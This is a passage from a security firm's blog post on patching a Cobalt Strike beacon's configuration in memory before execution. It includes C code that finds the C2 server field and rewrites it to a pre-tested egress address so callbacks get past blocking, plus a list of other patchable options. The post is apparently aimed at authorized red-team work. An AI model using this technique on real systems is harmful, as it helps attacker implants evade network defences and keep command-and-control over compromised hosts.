</div></figure><h2>Can we even reach our C2?</h2><p>Next up is something that has annoyed most of us: execution of a payload that fails because our C2 channel is blocked. Many people will use Cobalt Strike's round-robin functionality to seed a number of potentially valid egress addresses, but this suffers from a number of drawbacks. First is the fact that each needs to be provided upfront, meaning we cannot adjust the C2 destination using an alternate channel if we find that we cannot connect. Secondly, the round-robin approach doesn't remove any blocked destinations from its pool, meaning if only one (1) out of four (4) targets is valid, you will still be hitting three (3) potentially blocked locations each time the beacon cycles.</p><p>So how do we go about updating something like our C2 destination? Similar to the user-agent option, we again need to grab our configuration block and hunt for the C2 Server option, which is found using the ID of <code>8</code>:</p><pre class="wp-block-code"><code>struct CSConfigField *configField = (struct CSConfigField *)malleable;
while(SWAP_UINT16(configField-&gt;ID) != 0x00) {
  if (SWAP_UINT16(configField-&gt;ID) == CS_OPTION_C2) {
    // Do something with our c2 target here
        break;
  }

  configField = (struct CSConfigField *)((char *)configField + 6 + SWAP_UINT16(configField-&gt;dataLength));
}</code></pre><p>Before we update our callback destination, we need to have some idea of where to point our C2. For the purposes of this proof of concept (POC), we are going to use a hardcoded list of endpoints that are checked for connectivity, but feel free to get creative with your egress selection process. At TrustedSec, we have crafted a few options to select an appropriate C2 destination. One that works particularly well is a rule-based selection based on DNS CNAME records, allowing the rotation, removal, or addition of new locations as required:</p><figure class="wp-block-image size-large center"><img src="https://www.trustedsec.com/wp-content/uploads/2021/01/Untitled-1.png" alt="" class="wp-image-23512" /></figure><p>Once we have testing connectivity to make sure that everything will work, all that is left to do is to update our C2 location in our beacon configuration:</p><pre class="wp-block-code"><code>strncpy(configField-&gt;data, "derivedc2address.com,/Page", configField-&gt;dataLength);</code></pre><p>Here it is worth noting the format of the configuration option, where we have our C2 address of <code>derivedc2address.com</code> followed by the GET page of <code>/Page</code>. The page option needs to match your malleable profile (unless you use a customised redirector), but we are free to set the target as we wish.</p><p>Finally, we re-XOR our config, release the beacon, and watch it connect to our newly selected destination, which we have verified upfront will work:</p><figure class="wp-block-embed is-type-video is-provider-youtube wp-block-embed-youtube wp-embed-aspect-4-3 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
https://youtu.be/fE4nPA_eeZE
</div></figure><p>What options are available for us to modify before execution? Some interesting options are:</p><ul><li>2 (Short) - Port</li><li>3 (Int) - Sleep Time</li><li>5 (Short) - Jitter</li><li>8 (256 byte string) - C2 Server</li><li>9 (128 byte string) - User Agent</li><li>10 (64 byte string) - Post URI</li><li>14 (16 byte data) - SpawnTo</li><li>15 (128 byte string) - Pipe Name</li><li>26 (16 byte string) - GET verb</li><li>27 (16 byte string) - POST verb</li><li>28 (Int - 96 as true, 0 as false) - Should Chunk Posts</li><li>29 (64 byte string) - SpawnTo (x86)</li><li>30 (64 byte string) - SpawnTo (x64)</li></ul><p>For a full list you can either review Cobalt Strike's <code>BeaconPayload.class</code>, or refer to <a href="https://github.com/Sentinel-One/CobaltStrikeParser/blob/81726103455f4f2789b2388387093f087a7a7724/parse_beacon_config.py#L219">defensive tools</a> which have a pretty comprehensive list already.</p><p>A sample of the code used in this post is now available on GitHub <a href="https://gist.github.com/xpn/6c40d620607e97c2a09c70032d32d278">here</a>, enjoy (and get creative)!</p></div><template x-if="mobile"><div class="mb-p24 mt-p56 pt-p32 border-t first:border-t-none"><div class="w-full"><p id="share-label" class="text-xs font-mono mb-p16">Share</p><ul id="share-icons" class="flex items-center" aria-describedBy="share-label"><li class="ml-p12"><a href="" target="_blank" title="Share URL" data-target="https://trustedsec.com/blog/tailoring-cobalt-strike-on-target"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-share" /></svg></span><span class="sr-only">Share URL</span></a></li><li class="ml-p12"><a href="/cdn-cgi/l/email-protection#17286462757d7274632a547f72747c322527786263322527637f7e643225277665637e747b723225277165787a3225274365626463727344727432252631767a672c7578736e2a43767e7b78657e7970322527547875767b633225274463657e7c7232252778793225274376657072633224563225277f63636764322456322551322551636562646372736472743974787a322551757b787032255163767e7b78657e79703a747875767b633a6463657e7c723a78793a637665707263" target="_blank" title="Share via Email" data-target="https://trustedsec.com/blog/tailoring-cobalt-strike-on-target"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-email" /></svg></span><span class="sr-only">Share via Email</span></a></li><li class="ml-p12"><a href="http://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Ftailoring-cobalt-strike-on-target" target="_blank" title="Share on Facebook" onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=300,width=600');return false;" data-target="https://trustedsec.com/blog/tailoring-cobalt-strike-on-target"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-facebook" /></svg></span><span class="sr-only">Share on Facebook</span></a></li><li class="ml-p12"><a href="http://twitter.com/share?text=Tailoring%20Cobalt%20Strike%20on%20Target%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Ftailoring-cobalt-strike-on-target" title="Share on X" rel="nofollow" onclick="javascript:window.open(this.href,'', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=300,width=600');return false;" data-target="https://trustedsec.com/blog/tailoring-cobalt-strike-on-target"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-twitter" /></svg></span><span class="sr-only">Share on X</span></a></li><li class="ml-p12"><a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Ftailoring-cobalt-strike-on-target&amp;mini=true" target="_blank" title="Share on LinkedIn" onclick="javascript:window.open(this.href, '', 'menubar=no,toolbar=no,resizable=yes,scrollbars=yes,height=700,width=600');return false;" data-target="https://trustedsec.com/blog/tailoring-cobalt-strike-on-target"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-linkedin" /></svg></span><span class="sr-only">Share on LinkedIn</span></a></li></ul></div></div></template></div></div></div></div></section></div>
		</main>

		
		
<footer class="c-module-padding v-footer px-p24 mq768:px-p48 mq1024:px-p56 bg-black text-white py-p64 ">

	<div class="c-module-width v-footer max-w-p1440 mx-auto">

  <div class="mq768:flex">
    <div class="mb-p48 mq768:mb-none pb-p48 mq768:pb-none border-b mq768:border-none border-bar mq768:w-1/2 grow-0 shrink-0">
      <nav>
                        <div class="mb-p24 last:mb-none">
          <h2 class="text-h3"><a class="c-primary-nav-item v-footer inline-block overflow-hidden relative z-1 rounded-lg pt-p4 pb-p6 px-p8 transition-colors duration-500 group-hover/top:text-black hover:text-black focus:text-black before:absolute before:inset-y-0 before:left-0 before:right-full before:duration-500 before:transition-all before:bg-gibson before:-z-1 group-hover/top:before:right-0 group-hover/top:before:bg-gibson hover:before:right-0 hover:before:bg-gibson focus:before:right-0 focus:before:bg-gibson" href="https://trustedsec.com/blog">Blog</a></h2>
                  </div>
                <div class="mb-p24 last:mb-none">
          <h2 class="text-h3"><a class="c-primary-nav-item v-footer inline-block overflow-hidden relative z-1 rounded-lg pt-p4 pb-p6 px-p8 transition-colors duration-500 group-hover/top:text-black hover:text-black focus:text-black before:absolute before:inset-y-0 before:left-0 before:right-full before:duration-500 before:transition-all before:bg-gibson before:-z-1 group-hover/top:before:right-0 group-hover/top:before:bg-gibson hover:before:right-0 hover:before:bg-gibson focus:before:right-0 focus:before:bg-gibson" href="https://trustedsec.com/tools">Tools</a></h2>
                  </div>
                <div class="mb-p24 last:mb-none">
          <h2 class="text-h3"><a class="c-primary-nav-item v-footer inline-block overflow-hidden relative z-1 rounded-lg pt-p4 pb-p6 px-p8 transition-colors duration-500 group-hover/top:text-black hover:text-black focus:text-black before:absolute before:inset-y-0 before:left-0 before:right-full before:duration-500 before:transition-all before:bg-gibson before:-z-1 group-hover/top:before:right-0 group-hover/top:before:bg-gibson hover:before:right-0 hover:before:bg-gibson focus:before:right-0 focus:before:bg-gibson" href="https://trustedsec.com/newsletter-signup">Newsletter Signup</a></h2>
                  </div>
              </nav>
    </div>

    <div class="flex-1">
      <a class="c-logo mb-p48 inline-block" href="https://trustedsec.com/">
        <svg
width="238" height="33" viewBox="0 0 238 33" fill="none" xmlns="http://www.w3.org/2000/svg" class="fill-white w-logo-sm mq1024:w-logo-lg">
<description>TrustedSec</description>
<path
d="M22.8448 0.673828H3.33368C3.09614 0.673828 2.93365 0.792573 2.84478 1.02944L0.0448049 7.11829C-0.014935 7.26689 -0.014935 7.3926 0.0448049 7.49608C0.103824 7.60026 0.222525 7.65161 0.400332 7.65161H8.35591V31.3405C8.35591 31.6371 8.50381 31.785 8.80037 31.785H15.6004C15.8962 31.785 16.0448 31.6371 16.0448 31.3405V7.65161H22.8448C23.1407 7.65161 23.2893 7.50372 23.2893 7.20724V1.11827C23.2893 0.822428 23.1407 0.673828 22.8448 0.673828Z" />
<path
d="M42.9495 19.5628C44.6676 18.7628 46.0009 17.5926 46.9496 16.0516C47.8975 14.5113 48.3718 12.778 48.3718 10.8516C48.3718 8.9558 47.9273 7.2294 47.0384 5.67388C46.1496 4.11833 44.8752 2.89607 43.2162 2.00721C41.5565 1.11827 39.6453 0.673828 37.4829 0.673828H26.1495C25.8529 0.673828 25.7051 0.822428 25.7051 1.11827V31.3405C25.7051 31.6371 25.853 31.785 26.1495 31.785H32.9051C33.2009 31.785 33.3495 31.6371 33.3495 31.3405V20.7183H35.305L41.2606 31.4739C41.3787 31.6815 41.5565 31.785 41.794 31.785H49.7051C49.9718 31.785 50.1051 31.6961 50.1051 31.5183C50.1051 31.4593 50.0752 31.3704 50.0162 31.2517L42.9495 19.5628ZM39.7718 13.1406C39.1641 13.6891 38.2384 13.9628 36.994 13.9628H33.3495V7.6516H36.994C38.2384 7.6516 39.1641 7.93359 39.7718 8.49611C40.3787 9.05928 40.6829 9.84473 40.6829 10.8516C40.6829 11.8294 40.3787 12.5926 39.7718 13.1406Z" />
<path
d="M74.7433 0.673828H67.9433C67.6468 0.673828 67.4989 0.822428 67.4989 1.11827V19.1627C67.4989 20.8516 67.0766 22.2003 66.2322 23.2073C65.3877 24.2149 64.2246 24.7183 62.7433 24.7183C61.262 24.7183 60.0912 24.2149 59.2322 23.2073C58.3725 22.2003 57.9433 20.8516 57.9433 19.1627V1.11827C57.9433 0.822428 57.7947 0.673828 57.4989 0.673828H50.7433C50.4468 0.673828 50.2988 0.822428 50.2988 1.11827V19.4739C50.2988 21.9336 50.7947 24.126 51.7878 26.0517C52.7801 27.978 54.21 29.4891 56.0767 30.585C57.9433 31.6815 60.1655 32.2294 62.7433 32.2294C65.3211 32.2294 67.5433 31.6815 69.41 30.585C71.2766 29.4891 72.7058 27.978 73.6989 26.0517C74.6912 24.126 75.1878 21.9336 75.1878 19.4739V1.11827C75.1878 0.822428 75.0392 0.673828 74.7433 0.673828Z" />
<path
d="M92.7366 14.4749C91.5957 13.8971 90.1366 13.3123 88.3588 12.7194C87.0255 12.2749 86.04 11.8603 85.4033 11.4749C84.7658 11.0901 84.4477 10.5714 84.4477 9.9193C84.4477 9.2679 84.7213 8.74152 85.2699 8.34157C85.8178 7.94154 86.5658 7.74156 87.5144 7.74156C88.6102 7.74156 89.6102 7.89712 90.5143 8.20822C91.4179 8.51932 92.1811 8.92702 92.8033 9.43048C93.0991 9.60819 93.3068 9.5492 93.4255 9.25267L96.1366 3.11929C96.2845 2.88246 96.2401 2.69015 96.0033 2.54152C95.2623 1.94919 94.188 1.41588 92.781 0.941552C91.3734 0.467929 89.7658 0.230469 87.9588 0.230469C85.588 0.230469 83.5588 0.674842 81.8699 1.56377C80.1811 2.45271 78.9067 3.64569 78.0477 5.14155C77.1879 6.63809 76.7588 8.29012 76.7588 10.0971C76.7588 12.0527 77.181 13.6304 78.0254 14.8305C78.8699 16.0304 79.8401 16.9124 80.9366 17.4749C82.0325 18.0381 83.4845 18.6159 85.2921 19.2083C86.7144 19.6826 87.7588 20.127 88.4255 20.5416C89.0922 20.9568 89.4255 21.5194 89.4255 22.2305C89.4255 22.9715 89.1366 23.5715 88.5588 24.0304C87.981 24.4902 87.0845 24.7194 85.8699 24.7194C83.6477 24.7194 81.5144 23.9194 79.4699 22.3194C79.1734 22.1415 78.9657 22.2013 78.8477 22.4971L76.1366 28.6305C75.988 28.868 76.0325 29.0749 76.2699 29.2527C77.2477 30.0235 78.5366 30.7124 80.1366 31.3194C81.7366 31.9263 83.6178 32.2305 85.781 32.2305C88.1213 32.2305 90.1366 31.8006 91.8255 30.9416C93.5144 30.0825 94.8033 28.8971 95.6922 27.386C96.581 25.8749 97.0255 24.1569 97.0255 22.2305C97.0255 20.127 96.5956 18.4527 95.7366 17.2083C94.8769 15.9638 93.8768 15.0527 92.7366 14.4749Z" />
<path
d="M119.165 0.673828H99.654C99.4165 0.673828 99.254 0.792573 99.1651 1.02944L96.3651 7.11829C96.3054 7.26689 96.3054 7.3926 96.3651 7.49608C96.4242 7.60026 96.5429 7.65161 96.7207 7.65161H104.676V31.3405C104.676 31.6371 104.824 31.785 105.121 31.785H111.921C112.217 31.785 112.365 31.6371 112.365 31.3405V7.65161H119.165C119.461 7.65161 119.61 7.50372 119.61 7.20724V1.11827C119.61 0.822428 119.461 0.673828 119.165 0.673828Z" />
<path
d="M141.344 24.8072H129.521V19.6072H139.299C139.595 19.6072 139.744 19.4593 139.744 19.1627V13.0739C139.744 12.778 139.595 12.6294 139.299 12.6294H129.521V7.65161H140.766C141.062 7.65161 141.21 7.50372 141.21 7.20724V1.11827C141.21 0.822428 141.062 0.673828 140.766 0.673828H122.321C122.025 0.673828 121.877 0.822428 121.877 1.11827V31.3405C121.877 31.6371 122.025 31.785 122.321 31.785H141.344C141.639 31.785 141.788 31.6371 141.788 31.3405V25.2517C141.788 24.9558 141.639 24.8072 141.344 24.8072Z" />
<path
d="M168.054 8.36272C166.779 5.99261 164.994 4.11831 162.698 2.74049C160.402 1.36277 157.802 0.673828 154.898 0.673828H144.409C144.113 0.673828 143.965 0.822428 143.965 1.11827V31.3405C143.965 31.6371 144.113 31.785 144.409 31.785H154.898C157.832 31.785 160.438 31.0961 162.72 29.7183C165.002 28.3406 166.779 26.4669 168.054 24.0961C169.327 21.726 169.965 19.1037 169.965 16.2294C169.965 13.3552 169.327 10.7336 168.054 8.36272ZM161.431 20.2961C160.838 21.6148 159.979 22.6961 158.854 23.5406C157.727 24.385 156.424 24.8072 154.943 24.8072H151.609V7.6516H154.943C156.424 7.6516 157.727 8.07387 158.854 8.91832C159.979 9.76272 160.838 10.8447 161.431 12.1628C162.024 13.4815 162.32 14.837 162.32 16.2294C162.32 17.6218 162.024 18.9781 161.431 20.2961Z" />
<path
d="M186.612 14.4749C185.471 13.8971 184.012 13.3123 182.234 12.7194C180.9 12.2749 179.915 11.8603 179.278 11.4749C178.641 11.0901 178.323 10.5714 178.323 9.9193C178.323 9.2679 178.596 8.74152 179.145 8.34157C179.693 7.94154 180.441 7.74156 181.389 7.74156C182.485 7.74156 183.485 7.89712 184.389 8.20822C185.293 8.51932 186.056 8.92702 186.678 9.43048C186.974 9.60819 187.182 9.5492 187.301 9.25267L190.012 3.11929C190.159 2.88246 190.115 2.69015 189.878 2.54152C189.137 1.94919 188.063 1.41588 186.656 0.941552C185.248 0.467929 183.641 0.230469 181.834 0.230469C179.463 0.230469 177.434 0.674842 175.745 1.56377C174.056 2.45271 172.782 3.64569 171.923 5.14155C171.063 6.63809 170.634 8.29012 170.634 10.0971C170.634 12.0527 171.056 13.6304 171.901 14.8305C172.745 16.0304 173.715 16.9124 174.812 17.4749C175.907 18.0381 177.36 18.6159 179.167 19.2083C180.589 19.6826 181.634 20.127 182.3 20.5416C182.967 20.9568 183.301 21.5194 183.301 22.2305C183.301 22.9715 183.012 23.5715 182.434 24.0304C181.856 24.4902 180.959 24.7194 179.745 24.7194C177.523 24.7194 175.389 23.9194 173.345 22.3194C173.048 22.1415 172.841 22.2013 172.723 22.4971L170.012 28.6305C169.863 28.868 169.907 29.0749 170.145 29.2527C171.123 30.0235 172.412 30.7124 174.012 31.3194C175.612 31.9263 177.493 32.2305 179.656 32.2305C181.996 32.2305 184.012 31.8006 185.701 30.9416C187.389 30.0825 188.678 28.8971 189.567 27.386C190.456 25.8749 190.9 24.1569 190.9 22.2305C190.9 20.127 190.471 18.4527 189.612 17.2083C188.752 15.9638 187.752 15.0527 186.612 14.4749Z" />
<path
d="M212.326 24.8072H200.504V19.6072H210.282C210.577 19.6072 210.726 19.4593 210.726 19.1627V13.0739C210.726 12.778 210.577 12.6294 210.282 12.6294H200.504V7.65161H211.748C212.044 7.65161 212.193 7.50372 212.193 7.20724V1.11827C212.193 0.822428 212.044 0.673828 211.748 0.673828H193.304C193.007 0.673828 192.859 0.822428 192.859 1.11827V31.3405C192.859 31.6371 193.007 31.785 193.304 31.785H212.326C212.622 31.785 212.771 31.6371 212.771 31.3405V25.2517C212.771 24.9558 212.622 24.8072 212.326 24.8072Z" />
<path
d="M237.267 29.2083L234.511 23.2083C234.422 23.0305 234.303 22.9416 234.156 22.9416C234.096 22.9416 234.007 22.9715 233.889 23.0305C232.14 24.1569 230.259 24.7194 228.244 24.7194C226.555 24.7194 225.14 24.3048 224 23.4749C222.859 22.6458 222.015 21.5861 221.467 20.2972C220.918 19.0082 220.644 17.6526 220.644 16.2305C220.644 14.8083 220.918 13.4527 221.467 12.1638C222.015 10.8749 222.867 9.81586 224.022 8.98602C225.178 8.15685 226.615 7.74159 228.333 7.74159C230.111 7.74159 231.815 8.26033 233.444 9.29714C233.563 9.38597 233.674 9.41589 233.778 9.38597C233.881 9.35687 233.962 9.26794 234.022 9.11934L236.778 2.98603C236.896 2.71935 236.837 2.51238 236.6 2.36373C234.2 0.941566 231.444 0.230469 228.333 0.230469C225.281 0.230469 222.592 0.949163 220.267 2.386C217.94 3.82348 216.148 5.76373 214.889 8.20822C213.629 10.6527 213 13.3269 213 16.2305C213 19.134 213.629 21.8083 214.889 24.2526C216.148 26.6971 217.918 28.6381 220.2 30.0749C222.481 31.5124 225.118 32.2305 228.111 32.2305C231.696 32.2305 234.703 31.4159 237.133 29.786C237.281 29.6971 237.355 29.5936 237.355 29.4749C237.355 29.4159 237.326 29.327 237.267 29.2083Z" />
</svg>      </a>

              <div class="font-mono text-h6">
          3485 Southwestern Boulevard<br />
Fairlawn, OH 44333<br />
<br />
1-877-550-4728
        </div>
      
              <ul class="flex items-center mt-p40 -mx-p16">
                      <li class="flex items-center px-p8">
              <a href="https://twitter.com/TrustedSec" class="p-p8 group"><svg role="presentation" class="c-icon v-social w-p24 h-p24 stroke-none fill-white transition-colors group-hover:fill-gibson group-focus:fill-gibson"><use href="/custom-ui/icons.svg?1.26#icon-twitter" xlink:href="/custom-ui/icons.svg?1.26#icon-twitter"   /></svg> <span class="sr-only">twitter</span></a>
            </li>
                      <li class="flex items-center px-p8">
              <a href="https://www.linkedin.com/company/trustedsec-llc/" class="p-p8 group"><svg role="presentation" class="c-icon v-social w-p24 h-p24 stroke-none fill-white transition-colors group-hover:fill-gibson group-focus:fill-gibson"><use href="/custom-ui/icons.svg?1.26#icon-linkedin" xlink:href="/custom-ui/icons.svg?1.26#icon-linkedin"   /></svg> <span class="sr-only">linkedin</span></a>
            </li>
                      <li class="flex items-center px-p8">
              <a href="https://www.youtube.com/@TrustedSecTV" class="p-p8 group"><svg role="presentation" class="c-icon v-social w-p24 h-p24 stroke-none fill-white transition-colors group-hover:fill-gibson group-focus:fill-gibson"><use href="/custom-ui/icons.svg?1.26#icon-youtube" xlink:href="/custom-ui/icons.svg?1.26#icon-youtube"   /></svg> <span class="sr-only">youtube</span></a>
            </li>
                      <li class="flex items-center px-p8">
              <a href="https://www.facebook.com/1trustedsec/" class="p-p8 group"><svg role="presentation" class="c-icon v-social w-p24 h-p24 stroke-none fill-white transition-colors group-hover:fill-gibson group-focus:fill-gibson"><use href="/custom-ui/icons.svg?1.26#icon-facebook" xlink:href="/custom-ui/icons.svg?1.26#icon-facebook"   /></svg> <span class="sr-only">facebook</span></a>
            </li>
                      <li class="flex items-center px-p8">
              <a href="https://discord.gg/trustedsec" class="p-p8 group"><svg role="presentation" class="c-icon v-social w-p24 h-p24 stroke-none fill-white transition-colors group-hover:fill-gibson group-focus:fill-gibson"><use href="/custom-ui/icons.svg?1.26#icon-discord" xlink:href="/custom-ui/icons.svg?1.26#icon-discord"   /></svg> <span class="sr-only">discord</span></a>
            </li>
                      <li class="flex items-center px-p8">
              <a href="https://trustedsec.com/feed.rss" class="p-p8 group"><svg role="presentation" class="c-icon v-social w-p24 h-p24 stroke-none fill-white transition-colors group-hover:fill-gibson group-focus:fill-gibson"><use href="/custom-ui/icons.svg?1.26#icon-rss" xlink:href="/custom-ui/icons.svg?1.26#icon-rss"   /></svg> <span class="sr-only">rss</span></a>
            </li>
                  </ul>
          </div>
  </div>

		<div class="mq768:flex items-start mt-p40 mq768:mt-p64">
			<nav class="mq768:w-1/2">
												<ul class="mq768:flex">
										<li class="mr-p32 mb-p16 mq768:mb-none"><a class="c-button v-url relative z-10 overflow-hidden overflow-ellipsis w-auto inline-block group p-p4 underline rounded-p8 group-hover:text-black group-focus:text-black hover:text-black focus:text-black focus:outline-none transition-colors duration-500 before:absolute before:-z-1 before:inset-y-0 before:left-0 before:right-full before:bg-gibson before:transition-all before:duration-500 before:duration-500 before:rounded-p4 hover:before:right-0 hover:before:bg-gibson focus:before:right-0 focus:before:bg-gibson disabled:hover:before:bg-transparent group-hover:before:right-0 group-hover:before:bg-gibson group-focus:before:right-0 group-focus:before:bg-gibson no-underline" href="https://trustedsec.com/terms-of-service">Terms Of Service</a></li>
										<li class="mr-p32 mb-p16 mq768:mb-none"><a class="c-button v-url relative z-10 overflow-hidden overflow-ellipsis w-auto inline-block group p-p4 underline rounded-p8 group-hover:text-black group-focus:text-black hover:text-black focus:text-black focus:outline-none transition-colors duration-500 before:absolute before:-z-1 before:inset-y-0 before:left-0 before:right-full before:bg-gibson before:transition-all before:duration-500 before:duration-500 before:rounded-p4 hover:before:right-0 hover:before:bg-gibson focus:before:right-0 focus:before:bg-gibson disabled:hover:before:bg-transparent group-hover:before:right-0 group-hover:before:bg-gibson group-focus:before:right-0 group-focus:before:bg-gibson no-underline" href="https://trustedsec.com/privacy-policy">Privacy Policy</a></li>
									</ul>
							</nav>
			<div class="mq768:pl-p32 mq768:flex mq768:justify-end mq768:w-1/2">
        

  
<div x-comp="easterEgg" x-data="easterEgg({})">
  <button @click="onClick" class="cursor-help">© Copyright 2025 by TrustedSec. All rights reserved.</button>
  <template x-if="show">
    <div class="bg-black fixed inset-0 z-100 overflow-scroll" x-ref="container">
      <div class="relative z-20 max-w-p768 mx-auto px-p24">
        <div class="text-gibson font-mono text-h4 leading-xl">
          
          <div x-ref="typeBlocks" class="whitespace-pre-line inline break-words">
            
                                <span data-typeblock data-typewrite>Initializing...</span>
                
            
                                <span data-typeblock data-paste>group_info = kmalloc(sizeof(*group_info) + nblocks*sizeof(gid_t *), GFP_USER); 
if (!group_info) return NULL; 
group_info-&gt;ngroups = gidsetsize; group_info-&gt;nblocks = nblocks; 
atomic_set(&amp;group_info-&gt;usage, 1); if (gidsetsize &lt;= NGROUPS_SMALL) 
group_info-&gt;blocks[0] = group_info-&gt;small_block; else { for (i = 0; i &lt; nblocks; i++)
.
.
.</span>
                
            
                                <span data-typeblock data-paste>struct group_info init_groups = { .usage = ATOMIC_INIT(2) }; 
struct group_info *groups_alloc(int gidsetsize){ 
struct group_info *group_info; 
int nblocks; 
int i; 
nblocks = (gidsetsize + NGROUPS_PER_BLOCK - 1) / NGROUPS_PER_BLOCK; 
nblocks = nblocks ? : 1; 
.
.
.</span>
                
            
                                <span data-typeblock data-paste>struct group_info init_groups = { .usage = ATOMIC_INIT(2) }; 
struct group_info *groups_alloc(int gidsetsize){ 
struct group_info *group_info; 
int nblocks; 
int i; 
nblocks = (gidsetsize + NGROUPS_PER_BLOCK - 1) / NGROUPS_PER_BLOCK; 
nblocks = nblocks ? : 1; 
.
.
.</span>
                
            
                                <span data-typeblock data-paste>struct group_info init_groups = { .usage = ATOMIC_INIT(2) }; 
struct group_info *groups_alloc(int gidsetsize){ 
struct group_info *group_info; 
int nblocks; 
int i; 
nblocks = (gidsetsize + NGROUPS_PER_BLOCK - 1) / NGROUPS_PER_BLOCK; 
nblocks = nblocks ? : 1; 
.
.
.</span>
                
            
                                <span data-typeblock data-typewrite>Loading...</span>
                
            
                                <span data-typeblock data-typewrite>0% =================================================== 100%</span>
                
            
                                <span data-typeblock data-paste>Congratulations!

You have discovered our secret.</span>
                
            
                                <span data-typeblock data-typewrite>Check out admin/globals/easterEgg to customize this text!</span>
                
            
                                <span data-typeblock data-paste>Download our easter egg below:</span>
                
            
                                <span data-typeblock data-cta>
                    <a href="https://trusted-sec.files.svdcdn.com/production/files/obfuscated.py.zip?dm=1690294696" download class="underline block">Download File</a>
                  </span>
                
                      </div>

        </div>
      </div>
      <img src="/ui/spinning-smiley.gif" alt="Spinning smiley face logo" class="fixed z-10 top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full max-w-p768 opacity-30"/>
    </div>
  </template>
</div>      </div>
		</div>
	</div>
</footer>



  
<div class="c-modal fixed inset-0 z-100 hidden" x-comp="modal" x-data="modal({id:'modal-component'})" x-show="$store.modal.show" x-trap="$store.modal.show" x-bind:aria-hidden="!$store.modal.show" @keydown="keyPress($event)"
  x-transition:enter="c-modal-enter"
  x-transition:enter-start="c-modal-enter-start"
  x-transition:enter-end="c-modal-enter-end"
  x-transition:leave="c-modal-leave"
  x-transition:leave-start="c-modal-leave-start"
  x-transition:leave-end="c-modal-leave-end">
    <div class="w-full h-full bg-overlay fixed inset-0 z-0" tabindex="-1">

    <div class="relative z-10 flex flex-col w-full h-full justify-center items-center p-p12 mq768:p-none">
      <div id="modal-component" class="c-modal-box relative outline-none"
        :class="modalClass(true)"
        :tabindex="($store.modal.show) ? '-1' : false"
        :aria-labelledby="showHeading() ? 'modal-component-title' : false"
        :aria-label="getLabel()"
        @focus="activate()"
        aria-role="dialog"
        x-ref="dialog">
        <template x-if="showHeading()">
          <header>
            <h2 id="modal-component-title" class="pt-p32 px-p32 text-h5" x-ref="heading" x-text="$store.modal.heading"></h2>
          </header>
        </template>
        <template x-if="$store.modal.content" id="modal-content">
          <div class="c-content p-p32" tabindex="-1" x-ref="content"></div>
        </template>
        <button class="absolute z-50 overflow-hidden w-p24 h-p24 flex items-center justify-center border-black border top-p24 right-p24 group hover:bg-black" @click="closeModal()">
          <svg role="presentation" class="c-icon h-p12 w-p12 group-hover:fill-white"><use xlink:href="/ui/icons.svg?1.26#icon-close" /></svg>
          <span class="sr-only">Close</span>
        </button>
        <button x-show="$store.modal.transcript" class="text-btn text-white uppercase tracking-widest px-p8 py-p16" @click="showTranscript($event)" x-text="$store.modal.showTranscript ? 'Hide Transcript' : 'Show Transcript'">Show Transcript</button>
      </div>
      <div x-show="$store.modal.showTranscript" class="relative -top-ms bg-white text-segment w-full max-w-p768 mx-auto overflow-auto px-sm" :class="modalClass()"  x-ref="transcript">
        <div x-collapse.duration.700ms>
          <div class="py-p32 mq768:px-p32" id="modal-transcript" tabindex="0"></div>
        </div>
      </div>
    </div>

  </div>
  </div>
		<!-- Start cookieyes banner --> 
<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script id="cookieyes" type="text/javascript" src="https://cdn-cookieyes.com/client_data/e4af32b26adc2dfe97ec10f5/script.js"></script> 
<!-- End cookieyes banner -->

		
	<script type="application/ld+json">{"@context":"http://schema.org","@graph":[{"@type":"WebSite","author":{"@id":"#identity"},"copyrightHolder":{"@id":"#identity"},"copyrightYear":"2021","creator":{"@id":"#creator"},"dateCreated":"2023-08-24T11:28:31-04:00","dateModified":"2025-03-19T14:54:55-04:00","datePublished":"2021-01-28T00:00:00-05:00","description":"Patching Cobalt Strike's beacon payload on target to ensure successful C2 execution, including customizing user-agent and C2 server options for optimized phishing campaigns.","headline":"Tailoring Cobalt Strike on Target","image":{"@type":"ImageObject","url":"https://trusted-sec.transforms.svdcdn.com/production/images/012721-Chester-Cobalt-Blog-LinkedIn.png?w=1200&h=630&q=82&auto=format&fit=crop&dm=1695232909&s=4bf1fdbc127bd281b18c4bf23b65d994"},"inLanguage":"en-us","mainEntityOfPage":"https://trustedsec.com/blog/tailoring-cobalt-strike-on-target","name":"Tailoring Cobalt Strike on Target","publisher":{"@id":"#creator"},"url":"https://trustedsec.com/blog/tailoring-cobalt-strike-on-target"},{"@id":"#identity","@type":"LocalBusiness","address":{"@type":"PostalAddress","addressCountry":"US","addressLocality":"Fairlawn","addressRegion":"OH","postalCode":"44333","streetAddress":"3485 Southwestern 